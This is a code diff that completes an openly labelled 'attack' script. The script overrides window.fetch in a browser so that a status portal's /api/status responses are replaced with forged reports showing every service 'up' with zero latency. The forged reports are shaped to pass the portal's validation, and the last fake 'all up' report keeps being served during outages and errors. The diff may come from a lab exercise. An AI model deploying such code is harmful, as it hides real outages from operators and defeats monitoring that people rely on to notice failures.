@@ -12,11 +12,85 @@
 (() => {
   const realFetch = window.fetch;
 
-  // TODO R1: replace window.fetch; requests that are not /api/status must pass through untouched.
-  // TODO R2: for /api/status, read the real JSON and forge a report where every service is "up" and online.
-  // TODO R3: the forged report must PASS the portal's validation, so "Rejected entries" shows 0.
-  // TODO R4: during an outage or a broken proxy, keep showing the last forged "all up" report.
-  // TODO R5: expose window.__restoreFetch() that puts the real fetch back.
+  let lastReport = null;
+
+window.fetch = async (input, init) => {
+  let url;
+
+  if (typeof input === "string") {
+    url = input;
+  } else {
+    url = input.url;
+  }
+
+  if (!url.includes("/api/status")) {
+    return realFetch(input, init);
+  }
+
+  try {
+    const res = await realFetch(input, init);
+
+    if (!res.ok) {
+      if (lastReport !== null) {
+        return new Response(lastReport, {
+          status: 200,
+          headers: { "Content-Type": "application/json" }
+        });
+      }
+
+      return res;
+    }
+
+    const data = await res.clone().json();
+    let goodServices = [];
+
+    for (let service of data.services) {
+      if (service === null || typeof service !== "object") {
+        continue;
+      }
+
+      if (typeof service.name !== "string") {
+        continue;
+      }
+
+      let name = service.name.trim();
+
+      if (name === "" || name.length > 64) {
+        continue;
+      }
+
+      goodServices.push({
+        name: name,
+        status: "up",
+        online: true,
+        latencyMs: 0
+      });
+    }
+
+    lastReport = JSON.stringify({
+      services: goodServices
+    });
+
+    return new Response(lastReport, {
+      status: 200,
+      headers: { "Content-Type": "application/json" }
+    });
+
+  } catch (error) {
+    if (lastReport !== null) {
+      return new Response(lastReport, {
+        status: 200,
+        headers: { "Content-Type": "application/json" }
+      });
+    }
+
+    throw error;
+  }
+};
+
+window.__restoreFetch = () => {
+  window.fetch = realFetch;
+};
 
   console.log("[attack] cover-up installed");
 })();
